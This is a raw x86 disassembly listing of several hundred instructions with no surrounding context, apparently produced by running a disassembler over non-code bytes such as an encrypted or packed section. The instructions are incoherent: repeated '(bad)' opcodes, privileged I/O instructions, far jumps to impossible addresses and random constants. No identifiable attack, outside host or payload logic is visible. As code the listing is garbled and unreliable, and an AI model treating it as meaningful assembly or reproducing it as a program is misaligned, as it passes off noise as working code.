  40afc5:	mov    ebp,0x39f4a39c
  40afca:	(bad)  
  40afcb:	adc    al,0xb
  40afcd:	xchg   DWORD PTR [esi],ebp
  40afcf:	add    al,0xe9
  40afd1:	loopne 0x40afe3
  40afd3:	push   ebp
  40afd4:	pop    esi
  40afd5:	jbe    0x40af84
  40afd7:	sahf   
  40afd8:	es pop eax
  40afda:	xchg   ebx,eax
  40afdb:	fwait
  40afdc:	cdq    
  40afdd:	push   edx
  40afde:	jbe    0x40afba
  40afe0:	icebp  
  40afe1:	ret    0x660d
  40afe4:	xchg   ecx,eax
  40afe5:	das    
  40afe6:	add    bh,BYTE PTR [ebp+ecx*8+0xf]
  40afea:	mov    WORD PTR [eax],?
  40afec:	adc    ebp,DWORD PTR [ecx]
  40afee:	repnz add edi,edx
  40aff1:	pop    ecx
  40aff2:	ss sahf 
  40aff4:	cli    
  40aff5:	stc    
  40aff6:	inc    ecx
  40aff7:	scas   eax,DWORD PTR es:[edi]
  40aff8:	jge    0x40afac
  40affa:	(bad)  
  40affb:	sbb    eax,0x1e0962eb
  40b000:	cmp    BYTE PTR [eax-0x4c],bl
  40b003:	(bad)  
  40b005:	and    eax,DWORD PTR [eax]
  40b007:	lds    ebp,FWORD PTR [esi-0x54f6d759]
  40b00d:	cmp    al,0xb4
  40b00f:	pop    edi
  40b010:	dec    ebp
  40b011:	lods   eax,DWORD PTR ds:[esi]
  40b012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b013:	shr    DWORD PTR [eax],0x1
  40b016:	jg     0x40b063
  40b018:	xor    ebx,ecx
  40b01a:	call   0xe6b6:0x4af8a3fa
  40b021:	or     eax,0x348ce796
  40b026:	dec    ebx
  40b027:	ins    BYTE PTR es:[edi],dx
  40b028:	mov    ds:0xa89cfb1a,al
  40b02d:	sub    BYTE PTR [edi-0x41bf88d9],ch
  40b033:	or     al,0xb1
  40b035:	add    edx,DWORD PTR [ebx+0x53]
  40b038:	inc    edi
  40b039:	jno    0x40b08c
  40b03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b03c:	lods   al,BYTE PTR ds:[esi]
  40b03d:	ss sahf 
  40b03f:	sbb    BYTE PTR [edi],0x57
  40b042:	adc    DWORD PTR [eax+0x1c712262],ebp
  40b048:	mov    esi,0xf96f07c0
  40b04d:	xchg   DWORD PTR [esi+0x62],edi
  40b050:	cs in  al,0xcb
  40b053:	ror    DWORD PTR [ebx-0x31],1
  40b056:	or     al,0x2
  40b058:	mov    bl,0xc8
  40b05a:	outs   dx,BYTE PTR ds:[esi]
  40b05b:	or     DWORD PTR [ebp-0x63],esp
  40b05e:	jle    0x40aff6
  40b060:	inc    ebp
  40b061:	int    0xd8
  40b063:	in     eax,dx
  40b064:	add    ax,0x56e9
  40b068:	jbe    0x40b0d6
  40b06a:	in     eax,dx
  40b06b:	(bad)  
  40b06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b06e:	pusha  
  40b06f:	out    0xbf,al
  40b071:	push   ss
  40b072:	cwde   
  40b073:	in     al,0xc
  40b075:	pop    ebp
  40b076:	push   es
  40b077:	imul   esi,DWORD PTR [ecx],0xffffffb1
  40b07a:	adc    DWORD PTR [eax+eax*4+0x4b65f3ed],edi
  40b081:	aas    
  40b082:	in     al,0xdb
  40b084:	les    edx,FWORD PTR [eax-0x3e]
  40b087:	dec    ebp
  40b088:	fimul  WORD PTR [edx+0x74]
  40b08b:	mov    al,0x5b
  40b08d:	leave  
  40b08e:	jne    0x40b07e
  40b090:	xchg   BYTE PTR [edx*2-0x70cce729],dh
  40b097:	mov    dh,0xcd
  40b099:	xchg   dh,cl
  40b09b:	ja     0x40b068
  40b09d:	jg     0x40b0f6
  40b09f:	mov    esi,0x10c057b9
  40b0a4:	call   0xc4684875
  40b0a9:	mov    al,ds:0x8b775a93
  40b0ae:	or     BYTE PTR [ecx],ch
  40b0b0:	(bad)  
  40b0b1:	cwde   
  40b0b2:	cmp    al,BYTE PTR [edi-0x23ba088d]
  40b0b8:	stos   DWORD PTR es:[edi],eax
  40b0b9:	add    DWORD PTR [esi+0x7137bb0c],esi
  40b0bf:	loope  0x40b0d0
  40b0c1:	lods   al,BYTE PTR ds:[esi]
  40b0c2:	pushf  
  40b0c3:	jmp    0x420b71f4
  40b0c8:	shr    DWORD PTR [ebp-0xb],0x2c
  40b0cc:	push   ebp
  40b0cd:	pushf  
  40b0ce:	aam    0xb1
  40b0d0:	rcr    DWORD PTR [edx],0xaa
  40b0d3:	(bad)  
  40b0d4:	mov    ch,0x17
  40b0d6:	loopne 0x40b12b
  40b0d8:	int    0xc4
  40b0da:	and    BYTE PTR [ecx+edx*8+0x1868e99c],0xe8
  40b0e2:	mov    cl,0xde
  40b0e4:	lods   eax,DWORD PTR ds:[esi]
  40b0e5:	pusha  
  40b0e6:	sar    DWORD PTR [esi-0x1d],cl
  40b0e9:	mov    edi,0xd77db767
  40b0ee:	and    al,0x6
  40b0f0:	sbb    ah,BYTE PTR [edi]
  40b0f2:	fild   QWORD PTR [ecx-0x39]
  40b0f5:	inc    ebp
  40b0f6:	sbb    BYTE PTR [ecx+eiz*2+0x2e2c2aa2],dh
  40b0fd:	xor    al,0x91
  40b0ff:	pop    eax
  40b100:	sub    al,BYTE PTR [ecx-0x29]
  40b103:	clc    
  40b104:	(bad)  
  40b105:	xor    al,0x58
  40b107:	or     DWORD PTR [esi-0x72],edx
  40b10a:	push   ebx
  40b10b:	push   edi
  40b10c:	outs   dx,DWORD PTR ds:[esi]
  40b10d:	adc    al,0x81
  40b10f:	pop    ds
  40b110:	mov    ah,0x2f
  40b112:	fistp  QWORD PTR [ecx+0x6b066fb5]
  40b118:	mov    al,bh
  40b11a:	data16 jb 0x40b0fe
  40b11d:	xchg   esp,eax
  40b11e:	jae    0x40b160
  40b120:	sub    BYTE PTR [eiz*8-0x7225abb6],bl
  40b127:	outs   dx,DWORD PTR ds:[esi]
  40b128:	repnz xor eax,0xc0a195c4
  40b12e:	jns    0x40b151
  40b130:	adc    esi,DWORD PTR [ebx]
  40b132:	out    0x4d,al
  40b134:	inc    esp
  40b135:	mov    ecx,0xa23492a8
  40b13a:	push   es
  40b13b:	pop    ds
  40b13c:	out    0x34,eax
  40b13e:	mov    eax,DWORD PTR [eax]
  40b140:	(bad)  
  40b141:	dec    ecx
  40b142:	mov    esp,0xb24d9791
  40b147:	mov    BYTE PTR [eax-0x1568b272],dl
  40b14d:	repnz in al,0xf7
  40b150:	add    al,0xff
  40b152:	stc    
  40b153:	scas   eax,DWORD PTR es:[edi]
  40b154:	sti    
  40b155:	xchg   edx,eax
  40b156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b157:	scas   eax,DWORD PTR es:[edi]
  40b158:	test   eax,0xa1697697
  40b15d:	sub    eax,DWORD PTR [edi+0x7701d3ab]
  40b163:	(bad)  
  40b164:	aas    
  40b165:	das    
  40b166:	(bad)  
  40b169:	cmp    DWORD PTR [eax],edx
  40b16b:	push   cs
  40b16c:	sub    al,0xe9
  40b16e:	cmp    BYTE PTR [eax-0x3f],dh
  40b171:	repz inc esi
  40b173:	fs clc 
  40b175:	adc    al,BYTE PTR [edx-0x80]
  40b178:	push   esp
  40b179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b17a:	pop    es
  40b17b:	hlt    
  40b17c:	aaa    
  40b17d:	into   
  40b17e:	ins    DWORD PTR es:[edi],dx
  40b17f:	sub    eax,DWORD PTR [edi]
  40b181:	bound  ebp,QWORD PTR [ecx]
  40b183:	scas   eax,DWORD PTR es:[edi]
  40b184:	iret   
  40b185:	(bad)  
  40b186:	not    edi
  40b188:	ret    
  40b189:	loope  0x40b14f
  40b18b:	and    DWORD PTR [ebx],edx
  40b18d:	cmp    eax,0x6fa24464
  40b192:	shl    BYTE PTR [ebx],0x69
  40b195:	dec    esp
  40b196:	or     al,0x77
  40b198:	sti    
  40b199:	pop    es
  40b19a:	push   ds
  40b19b:	and    edx,edi
  40b19d:	popf   
  40b19e:	mov    bh,0xae
  40b1a0:	or     DWORD PTR [esp+esi*2-0x18],esi
  40b1a4:	adc    eax,0x3b535bcb
  40b1a9:	les    esp,FWORD PTR [esi+0x13a905f0]
  40b1af:	jbe    0x40b1ad
  40b1b1:	push   edi
  40b1b2:	mov    ds:0x54f0ec0a,eax
  40b1b7:	mov    BYTE PTR [ebx],al
  40b1b9:	fdiv   QWORD PTR [ebx-0x37]
  40b1bc:	mov    ebx,0xaa90bb08
  40b1c1:	xchg   ebx,eax
  40b1c2:	int3   
  40b1c3:	mov    eax,0xe5d91aaa
  40b1c8:	inc    bl
  40b1ca:	cmp    eax,0x45222f2b
  40b1cf:	push   0x1
  40b1d1:	cvttps2pi mm2,QWORD PTR [eax+0x3f]
  40b1d5:	push   edi
  40b1d6:	ss pop ds
  40b1d8:	daa    
  40b1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1da:	sbb    eax,0x94c711dd
  40b1df:	and    al,BYTE PTR [esi+0x22]
  40b1e2:	or     BYTE PTR [ebx-0x333db93e],dl
  40b1e8:	ja     0x40b23b
  40b1ea:	bound  esp,QWORD PTR [edi+0x694caaa9]
  40b1f0:	mov    al,ds:0xf55724f6
  40b1f5:	sbb    eax,0xe15040e4
  40b1fa:	ss je  0x40b1a7
  40b1fd:	sub    bh,BYTE PTR [ecx+0xd50b8c4]
  40b203:	and    eax,0xc0d35ea4
  40b208:	leave  
  40b209:	jg     0x40b274
  40b20b:	ds ins DWORD PTR es:[edi],dx
  40b20d:	xchg   esi,eax
  40b20e:	lahf   
  40b20f:	clc    
  40b210:	push   ds
  40b211:	into   
  40b212:	imul   edi,DWORD PTR [edi-0x213aa4e9],0x60
  40b219:	cmovb  esp,DWORD PTR [edi-0x5b733a18]
  40b220:	push   ebx
  40b221:	mov    ds:0x7fdf5c93,al
  40b226:	loopne 0x40b280
  40b228:	sub    dh,BYTE PTR [ecx+0x5e92b769]
  40b22e:	out    0xd8,al
  40b230:	cwde   
  40b231:	rcl    DWORD PTR ds:0x2f5e4711,cl
  40b237:	cmp    DWORD PTR [ebp+esi*2+0x4564c37e],eax
  40b23e:	(bad)  
  40b23f:	push   ecx
  40b240:	cmp    DWORD PTR [ebx-0x5a],eax
  40b243:	pop    ss
  40b244:	and    esi,DWORD PTR [edi+0xc]
  40b247:	or     edx,edx
  40b249:	add    BYTE PTR [eax],cl
  40b24b:	ja     0x40b25e
  40b24d:	inc    ebp
  40b24e:	fst    DWORD PTR ds:0x3f4fe5d2
  40b254:	pop    eax
  40b255:	scas   eax,DWORD PTR es:[edi]
  40b256:	stos   DWORD PTR es:[edi],eax
  40b257:	(bad)  
  40b258:	nop
  40b259:	xor    al,0xa4
  40b25b:	mov    ebp,0xe18a2d53
  40b260:	cmp    al,BYTE PTR [ebp+ebp*4-0x1becd997]
  40b267:	sub    al,0xaf
  40b269:	xor    DWORD PTR [ebp+0x7c],esi
  40b26c:	scas   eax,DWORD PTR es:[edi]
  40b26d:	retf   
  40b26e:	ret    
  40b26f:	push   cs
  40b270:	imul   ecx,DWORD PTR [ebx+0x1e],0xa1dc5851
  40b277:	sbb    ah,BYTE PTR [ecx-0x30fd915f]
  40b27d:	and    dl,BYTE PTR [ebx-0x526606fa]
  40b283:	dec    ebp
  40b284:	mov    ebx,0x66278c68
  40b289:	(bad)  
  40b28a:	or     ebp,DWORD PTR [eax-0x10]
  40b28d:	pop    es
  40b28e:	cmp    esp,DWORD PTR [eax]
  40b290:	xor    eax,0x7fc5f4b7
  40b295:	mov    al,0x2b
  40b297:	jle    0x40b249
  40b299:	lock out 0x34,eax
  40b29c:	dec    eax
  40b29d:	imul   edx,DWORD PTR [ebp+0x150ec2ca],0x68
  40b2a4:	ins    DWORD PTR es:[edi],dx
  40b2a5:	scas   al,BYTE PTR es:[edi]
  40b2a6:	sbb    bl,BYTE PTR [eax+0x5de03408]
  40b2ac:	xchg   esp,eax
  40b2ad:	adc    al,BYTE PTR [eax]
  40b2af:	repnz mov cl,0xf4
  40b2b2:	mov    esp,DWORD PTR [eax]
  40b2b4:	bound  edi,QWORD PTR [ecx]
  40b2b6:	aam    0x8b
  40b2b8:	das    
  40b2b9:	inc    eax
  40b2ba:	mul    DWORD PTR [ebx+0x0]
  40b2bd:	das    
  40b2be:	inc    eax
  40b2bf:	leave  
  40b2c0:	es jo  0x40b2c3
  40b2c3:	ja     0x40b2fa
  40b2c5:	inc    esp
  40b2c6:	ficomp WORD PTR [edi+0x4b]
  40b2c9:	shl    eax,0xc5
  40b2cc:	xor    BYTE PTR [ecx+0x24],cl
  40b2cf:	repnz out 0x72,eax
  40b2d2:	shl    BYTE PTR [edx-0x1e],0xee
  40b2d6:	sbb    DWORD PTR [ebx+0x50f70a57],edi
  40b2dc:	ins    DWORD PTR es:[edi],dx
  40b2dd:	fld    st(6)
  40b2df:	jg     0x40b342
  40b2e1:	pop    eax
  40b2e2:	dec    esi
  40b2e3:	push   eax
  40b2e4:	jb     0x40b2e1
  40b2e6:	mov    ecx,0x3f5bf805
  40b2eb:	(bad)  
  40b2ec:	ret    
  40b2ed:	push   esp
  40b2ee:	xchg   esp,eax
  40b2ef:	lds    edx,FWORD PTR [ebx+0x77]
  40b2f2:	cdq    
  40b2f3:	(bad)  
  40b2f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2f5:	inc    ecx
  40b2f6:	mov    bl,0x5e
  40b2f8:	mov    dl,0x7c
  40b2fa:	jae    0x40b2c2
  40b2fc:	adc    DWORD PTR [esi-0x4a1cfc7b],0x3b
  40b303:	fs int 0xd0
  40b306:	fadd   QWORD PTR [edx+0xb]
  40b309:	into   
  40b30a:	dec    ebx
  40b30b:	mov    al,0x9f
  40b30d:	popa   
  40b30e:	adc    edi,DWORD PTR ds:0x44a8207b
  40b314:	push   edx
  40b315:	std    
  40b316:	push   ebp
  40b317:	pop    esi
  40b318:	call   0x26469e8d
  40b31d:	imul   BYTE PTR [ebx]
  40b31f:	test   DWORD PTR [ecx],ebx
  40b321:	test   BYTE PTR [edx],ah
  40b323:	lods   al,BYTE PTR ds:[esi]
  40b324:	into   
  40b325:	jmp    0x61aa:0x4db7816d
  40b32c:	and    al,0x2d
  40b32e:	cdq    
  40b32f:	xor    DWORD PTR [edx-0x36],edi
  40b332:	adc    cl,dh
  40b334:	ror    BYTE PTR ds:0x6828dc42,1
  40b33a:	aam    0xde
  40b33c:	jns    0x40b308
  40b33e:	or     al,0x8e
  40b340:	bound  edi,QWORD PTR [esi-0x5f]
  40b343:	cmp    dl,bl
  40b345:	(bad)  
  40b346:	xlat   BYTE PTR ds:[ebx]
  40b347:	call   0x610aec69
  40b34c:	popa   
  40b34d:	push   0xffffffd7
  40b34f:	fsub   QWORD PTR [ecx]
  40b351:	std    
  40b352:	test   eax,0x94ce0f3e
  40b357:	xchg   esp,eax
  40b358:	xor    DWORD PTR [eax*2+0x4d859e93],ecx
  40b35f:	pop    ebp
  40b360:	push   edi
  40b361:	jle    0x40b344
  40b363:	aam    0x19
  40b365:	adc    eax,0x38d1e801
  40b36a:	nop
  40b36b:	cmp    al,0xf9
  40b36d:	scas   eax,DWORD PTR es:[edi]
  40b36e:	iret   
  40b36f:	jae    0x40b3a2
  40b371:	inc    eax
  40b372:	pop    edx
  40b373:	mov    BYTE PTR [ebx+0x20d1c075],0x7c
  40b37a:	add    DWORD PTR [esi+0x34],ecx
  40b37d:	xor    dh,dl
  40b37f:	mov    dh,0x32
  40b381:	retf   0x4a54
  40b384:	dec    ecx
  40b385:	stos   BYTE PTR es:[edi],al
  40b386:	cmp    BYTE PTR [edx-0x11],0x3b
  40b38a:	mov    BYTE PTR [edi-0x546097d3],ah
  40b390:	gs mov bh,0xba
  40b393:	enter  0x1efd,0xf3
  40b397:	ins    DWORD PTR es:[edi],dx
  40b398:	shl    BYTE PTR [edx-0x34d7c2ab],1
  40b39e:	adc    edi,DWORD PTR [edi+0x2a]
  40b3a1:	(bad)  
  40b3a2:	lahf   
  40b3a3:	sub    dh,BYTE PTR [eax+0x44]
  40b3a6:	aaa    
  40b3a7:	clc    
  40b3a8:	cmp    al,BYTE PTR [edi+0x56]
  40b3ab:	mov    ebx,0xa0e16828
  40b3b0:	int3   
  40b3b1:	cwde   
  40b3b2:	cmp    DWORD PTR ds:0x70caa8db,ecx
  40b3b8:	mov    dh,0xed
  40b3ba:	nop
  40b3bb:	sub    ebx,ebp
  40b3bd:	xor    al,BYTE PTR [ebx-0x4e]
  40b3c0:	sbb    al,0x15
  40b3c2:	or     al,0x91
  40b3c4:	imul   esi,DWORD PTR [esi-0x3ffe6936],0xd8702cf0
  40b3ce:	adc    al,0x97
  40b3d0:	outs   dx,DWORD PTR ds:[esi]
  40b3d1:	lods   eax,DWORD PTR ds:[esi]
  40b3d2:	inc    eax
  40b3d3:	mov    esi,0xa59fea50
  40b3d8:	xor    ebp,DWORD PTR [edx+esi*2]
  40b3db:	int3   
  40b3dc:	sub    dl,dh
  40b3de:	je     0x40b396
  40b3e0:	fsubr  DWORD PTR [ebx+0x6fd7528d]
  40b3e6:	test   cl,bh
  40b3e8:	fcomp  QWORD PTR [eax+0x45ada830]
  40b3ee:	fsub   QWORD PTR ds:0xb7fb4e64
  40b3f4:	mov    al,bl
  40b3f6:	fisub  DWORD PTR ds:0x3fe42ac4
  40b3fc:	lahf   
  40b3fd:	or     DWORD PTR [edx+0x21a300d6],esi
  40b403:	aas    
  40b404:	mov    al,ds:0x9e8a2178
  40b409:	data16 loop 0x40b41f
  40b40c:	xchg   BYTE PTR [eax+ecx*4],ch
  40b40f:	mov    eax,0x43279864
  40b414:	sar    ecx,1
  40b416:	fucom  st(6)
  40b418:	into   
  40b419:	dec    ecx
  40b41a:	mov    ch,0xad
  40b41c:	xchg   DWORD PTR [edi],edx
  40b41e:	data16 xor ch,BYTE PTR [eax-0x48]
  40b422:	test   DWORD PTR [edi-0x5c],ecx
  40b425:	add    ebx,DWORD PTR [edi]
  40b427:	jl     0x40b481
  40b429:	mov    ds:0x68b044ac,al
  40b42e:	shl    esi,0xb
  40b431:	or     bl,BYTE PTR [esi+0x674b8c4f]
  40b437:	and    al,0x3c
  40b439:	shr    ch,0x41
  40b43c:	cmp    eax,0xa05f2284
  40b441:	fwait
  40b442:	dec    BYTE PTR [ecx]
  40b444:	jmp    0xa17a:0xc05a6fb
  40b44b:	jmp    0xe267fa2f
  40b450:	jp     0x40b416
  40b452:	pop    ss
  40b453:	adc    al,0x4e
  40b455:	push   edx
  40b456:	(bad)  [ebp+ecx*1-0x45]
  40b45a:	mov    dh,0xde
  40b45c:	iret   
  40b45d:	stc    
  40b45e:	or     eax,0x68528b0c
  40b463:	pop    ecx
  40b464:	xor    DWORD PTR [edx+0x5a723393],edx
  40b46a:	add    ebx,DWORD PTR [edx]
  40b46c:	imul   ebp,DWORD PTR [esi+0xf],0xffffff9a
  40b470:	and    ebx,DWORD PTR [ebx+edi*2]
  40b473:	jnp    0x40b429
  40b475:	mov    dh,0x57
  40b477:	jmp    0x6d3a2b7f
  40b47c:	jne    0x40b47f
  40b47e:	xor    BYTE PTR [ecx],dh
  40b480:	adc    eax,0xc28e337
  40b485:	mov    ds:0x4a246614,eax
  40b48a:	inc    eax
  40b48b:	push   cs
  40b48c:	in     al,0x36
  40b48e:	xchg   ebx,eax
  40b48f:	sub    BYTE PTR [edx],0xaf
  40b492:	ror    BYTE PTR [eax-0xd],0x41
  40b496:	jo     0x40b4ec
  40b498:	push   0xcfe3f39d
  40b49d:	pusha  
  40b49e:	xor    al,al
  40b4a0:	(bad)  
  40b4a1:	xor    al,0xe9
  40b4a3:	lock cmp al,0xd
  40b4a6:	or     eax,0x66054278
  40b4ab:	mov    eax,ds:0x497633a5
  40b4b0:	xor    al,0x3
  40b4b2:	jg     0x40b520
  40b4b4:	or     al,0x39
  40b4b6:	sbb    esi,esi
  40b4b8:	adc    DWORD PTR [ebp+0x2007d409],ebx
  40b4be:	push   ss
  40b4bf:	xor    DWORD PTR [esi],ecx
  40b4c1:	ins    DWORD PTR es:[edi],dx
  40b4c2:	mov    ecx,0x977c1dd7
  40b4c7:	inc    eax
  40b4c8:	js     0x40b497
  40b4ca:	sbb    edx,DWORD PTR [edx]
  40b4cc:	xor    DWORD PTR [edi+0x1d],esi
  40b4cf:	enter  0xcaaa,0xd7
  40b4d3:	jmp    0x88c1:0x5a7d7961
  40b4da:	or     DWORD PTR [ecx],ecx
  40b4dc:	into   
  40b4dd:	xchg   ebp,eax
  40b4de:	call   0xfd277e59
  40b4e3:	push   cs
  40b4e4:	sub    eax,0x2a820ee9
  40b4e9:	sbb    ebx,eax
  40b4eb:	stc    
  40b4ec:	lods   eax,DWORD PTR ds:[esi]
  40b4ed:	push   ebp
  40b4ee:	cld    
  40b4ef:	xor    DWORD PTR [ebp+0x22],edx
  40b4f2:	cwde   
  40b4f3:	test   BYTE PTR [edi],bh
  40b4f5:	stc    
  40b4f6:	lea    edx,[ebp-0x12436647]
  40b4fc:	retf   0x9af0
  40b4ff:	pop    esp
  40b500:	or     eax,0xe2f4ba0b
  40b505:	jo     0x40b505
  40b507:	das    
  40b508:	push   edx
  40b509:	mov    eax,ds:0x2815deff
  40b50e:	gs iret 
  40b510:	sahf   
  40b511:	jns    0x40b4bd
  40b513:	push   es
  40b514:	inc    esp
  40b515:	mov    esi,0x90048475
  40b51a:	cmc    
  40b51b:	es nop
  40b51d:	add    ebx,DWORD PTR [esi+0x29ef7591]
  40b523:	rol    ebp,0x74
  40b526:	ss mov esp,0x924a0293
  40b52c:	mov    bl,0xc9
  40b52e:	push   0xffffffb0
  40b530:	or     dl,BYTE PTR [ebx+ecx*4-0x11494ff9]
  40b537:	push   edx
  40b538:	hlt    
  40b539:	pop    esi
  40b53a:	mov    bl,0xa0
  40b53c:	cmp    cl,BYTE PTR [edi-0x75e53af]
  40b542:	js     0x40b57b
  40b544:	icebp  
  40b545:	aam    0xca
  40b547:	in     eax,dx
  40b548:	mov    ds:0xf78da4d5,eax
  40b54d:	repz (bad) 
  40b54f:	imul   BYTE PTR [eax]
  40b551:	fs out 0x6,eax
  40b554:	mov    dh,0x88
  40b556:	push   ds
  40b557:	in     al,dx
  40b558:	cmp    edx,DWORD PTR [esi-0x55]
  40b55b:	or     cl,BYTE PTR [edi+0x330e5b9b]
  40b561:	or     edx,edi
  40b563:	mov    esi,0x2e272eb2
  40b568:	aaa    
  40b569:	push   esi
  40b56a:	aad    0xc7
  40b56c:	adc    al,0x36
  40b56e:	push   0x50
  40b570:	test   ecx,0xd980b1a5
  40b576:	xor    ah,0x7f
  40b579:	mov    cl,0x30
  40b57b:	push   ecx
  40b57c:	mov    dl,0x3e
  40b57e:	aas    
  40b57f:	xor    ah,bh
  40b581:	fild   WORD PTR [eax-0x66cee45a]
  40b587:	stc    
  40b588:	pop    ecx
  40b589:	or     edi,edi
  40b58b:	sahf   
  40b58c:	xor    al,0x6c
  40b58e:	and    BYTE PTR [esi-0x7],0xed
  40b592:	arpl   bx,sp
  40b594:	pop    edi
  40b595:	jnp    0x40b5fe
  40b597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b598:	(bad)  
  40b599:	sub    al,0x38
  40b59b:	sti    
  40b59c:	ret    
  40b59d:	fcomp  DWORD PTR [ebx-0x11]
  40b5a0:	sbb    eax,0x36e73f01
  40b5a5:	xchg   ecx,eax
  40b5a6:	pop    es
  40b5a7:	or     BYTE PTR [edi+edi*4],ch
  40b5aa:	out    0xe4,eax
  40b5ac:	dec    edi
  40b5ad:	cmp    edx,ebx
  40b5af:	xchg   DWORD PTR [ecx+edx*8-0x49],edi
  40b5b3:	dec    esi
  40b5b4:	aam    0xaf
  40b5b6:	mov    esi,0x5d84738a
  40b5bb:	outs   dx,DWORD PTR ds:[esi]
  40b5bc:	fdivr  QWORD PTR [edi-0x7a7d695a]
  40b5c2:	bound  esi,QWORD PTR [esi-0x5d]
  40b5c5:	mov    bl,0x37
  40b5c7:	mov    BYTE PTR [esi-0x55],0x1c
  40b5cb:	sub    bl,BYTE PTR [edx+ebx*8+0x4e]
  40b5cf:	xchg   ecx,eax
  40b5d0:	sbb    al,bh
  40b5d2:	aas    
  40b5d3:	pop    es
  40b5d4:	xor    esp,DWORD PTR ds:0x22a0f067
  40b5da:	stos   BYTE PTR es:[edi],al
  40b5db:	call   0xdf2e:0x4c88a78e
  40b5e2:	sub    al,0xb8
  40b5e4:	lods   al,BYTE PTR ds:[esi]
  40b5e5:	push   ss
  40b5e6:	add    ch,BYTE PTR [ecx+esi*2-0x38c9a758]
  40b5ed:	pop    es
  40b5ee:	jle    0x40b649
  40b5f0:	daa    
  40b5f1:	xor    al,0xb4
  40b5f3:	jne    0x40b674
  40b5f5:	push   ecx
  40b5f6:	(bad)
  40b5fa:	daa    
  40b5fb:	cdq    
  40b5fc:	loop   0x40b597
  40b5fe:	scas   al,BYTE PTR es:[edi]
  40b5ff:	jmp    0x40b645
  40b601:	adc    BYTE PTR ss:[eax-0x2246836],0x20
  40b609:	lods   eax,DWORD PTR ds:[esi]
  40b60a:	leave  
  40b60b:	push   0x2b
  40b60d:	adc    eax,0x1effa226
  40b612:	sti    
  40b613:	mov    ecx,0x317f679a
  40b618:	cmp    DWORD PTR [esi+esi*4],ecx
  40b61b:	sti    
  40b61c:	ror    DWORD PTR [ecx-0xaa5aa71],1
  40b622:	lods   eax,DWORD PTR ds:[esi]
  40b623:	jecxz  0x40b5e6
  40b625:	pop    es
  40b626:	gs jl  0x40b698
  40b629:	adc    ah,BYTE PTR [edi-0x8da9877]
  40b62f:	loop   0x40b5b3
  40b631:	(bad)  
  40b632:	or     esp,DWORD PTR [ecx-0x26]
  40b635:	sar    DWORD PTR [esi],1
  40b637:	jmp    0x40b627
  40b639:	test   ebp,esi
  40b63b:	and    BYTE PTR [ebx+0x65f9d4ec],dl
  40b641:	add    al,0x31
  40b643:	aas    
  40b644:	(bad)  
  40b645:	sbb    bl,al
  40b647:	arpl   WORD PTR [ecx],bp
  40b649:	inc    ebx
  40b64a:	pushf  
  40b64b:	out    dx,al
  40b64c:	arpl   WORD PTR [ebp-0x17],di
  40b64f:	pop    ss
  40b650:	pop    edi
  40b651:	mov    ds:0x7d772dbb,eax
  40b656:	sar    DWORD PTR [ebx+0x34a1a24a],0xcd
  40b65d:	(bad)  
  40b65e:	push   esi
  40b65f:	repz push eax
  40b661:	lods   eax,DWORD PTR ds:[esi]
  40b662:	push   ebp
  40b663:	dec    ebx
  40b664:	sub    eax,0xb95f8457
  40b669:	(bad)  
  40b66a:	jmp    0xce2c1075
  40b66f:	loope  0x40b64b
  40b671:	jo     0x40b69c
  40b673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b674:	fs push ebx
  40b676:	add    DWORD PTR [edi],0x45
  40b679:	lods   eax,DWORD PTR ds:[esi]
  40b67a:	cmp    DWORD PTR [edx-0x42],esi
  40b67d:	sbb    DWORD PTR [edi-0x5fa7a6ff],edi
  40b683:	push   DWORD PTR [eax]
  40b685:	not    DWORD PTR [ecx+0x29f3ae9b]
  40b68b:	push   0x3a
  40b68d:	push   0x12545936
  40b692:	repz cmp ebx,ecx
  40b695:	(bad)
  40b699:	jle    0x40b63b
  40b69b:	fst    QWORD PTR fs:[ecx]
  40b69e:	imul   ebx,DWORD PTR [edi-0x6507912c],0x5d3f2a8e
  40b6a8:	sbb    ecx,DWORD PTR gs:[eax-0x26957546]
  40b6af:	in     eax,dx
  40b6b0:	cld    
  40b6b1:	les    edx,FWORD PTR [esi]
  40b6b3:	sbb    ax,ax
  40b6b6:	leave  
  40b6b7:	rcr    DWORD PTR [ebp+0x6a],1
  40b6ba:	or     eax,edx
  40b6bc:	jp     0x40b672
  40b6be:	test   eax,0xf4396f05
  40b6c3:	and    edi,DWORD PTR [esi-0x54]
  40b6c6:	push   eax
  40b6c7:	push   es
  40b6c8:	sbb    ah,ah
  40b6ca:	je     0x40b743
  40b6cc:	rol    BYTE PTR [ebp+0x40be1fc],cl
  40b6d2:	into   
  40b6d3:	arpl   WORD PTR [edx-0x5662be8c],cx
  40b6d9:	xor    eax,0x4ca28339
  40b6de:	aaa    
  40b6df:	in     eax,dx
  40b6e0:	gs out 0x1,al
  40b6e3:	shl    BYTE PTR [eax],cl
  40b6e5:	jmp    0x40b6f8
  40b6e7:	(bad)  
  40b6e9:	sbb    BYTE PTR [edi+0x4d85909],bh
  40b6ef:	test   BYTE PTR [edx],ch
  40b6f1:	dec    ebx
  40b6f2:	mov    ds:0xfbc5c3c5,al
  40b6f7:	ficom  WORD PTR fs:[edx+ebx*8-0x59b4dd88]
  40b6ff:	mov    eax,0x77a21f3e
  40b704:	xchg   ebx,eax
  40b705:	int3   
  40b706:	adc    al,0xf7
  40b708:	pop    eax
  40b709:	push   0xffffffa9
  40b70b:	data16 arpl WORD PTR [ecx-0x71],cx
  40b70f:	ins    DWORD PTR es:[edi],dx
  40b710:	adc    BYTE PTR [ecx+0x3d],ah
  40b713:	sbb    al,0xca
  40b715:	dec    esp
  40b716:	ins    DWORD PTR es:[edi],dx
  40b717:	dec    eax
  40b718:	push   ecx
  40b719:	jo     0x40b71a
  40b71b:	push   edx
  40b71c:	mov    eax,ds:0xc9dd2acb
  40b721:	imul   esp,ebx,0xffffffa1
  40b724:	dec    ebp
  40b725:	add    al,0xc0
  40b727:	pop    ds
  40b728:	mov    esi,0xfac74eb9
  40b72d:	hlt    
  40b72e:	nop
  40b72f:	and    eax,DWORD PTR [ecx-0x64c62b20]
  40b735:	aam    0xdb
  40b737:	and    ch,BYTE PTR ds:0xa2bcd581
  40b73d:	leave  
